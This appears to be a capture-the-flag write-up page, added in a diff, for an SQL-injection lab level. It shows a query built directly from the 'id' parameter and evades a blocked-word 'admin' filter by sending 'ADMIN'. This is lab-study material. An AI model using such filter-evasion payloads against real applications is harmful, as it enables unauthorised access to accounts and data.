@@ -1,0 +1,30 @@
+---
+custom_edit_url: null
+pagination_next: null
+pagination_prev: null
+sidebar_position: 8
+---
+
+![1](https://github.com/Kunull/Write-ups/assets/110326359/fc58b667-606c-4fe8-87ab-d10342b5a1a4)
+
+We are provided with the SQL query:
+
+```sql
+SELECT id FROM prob_troll WHERE id='{$_GET[id]}'
+```
+
+This level blocks the `admin` word from the payload.
+
+However, SQL is not case sensitive. Therefore we can use `ADMIN` instead of `admin`.
+
+```
+?id=ADMIN
+```
+
+The resultant query then becomes:
+
+```sql
+SELECT id FROM prob_troll WHERE id='ADMIN'
+```
+
+![2](https://github.com/Kunull/Write-ups/assets/110326359/b726e13f-6c99-4ae8-b43f-83971c9caec3)
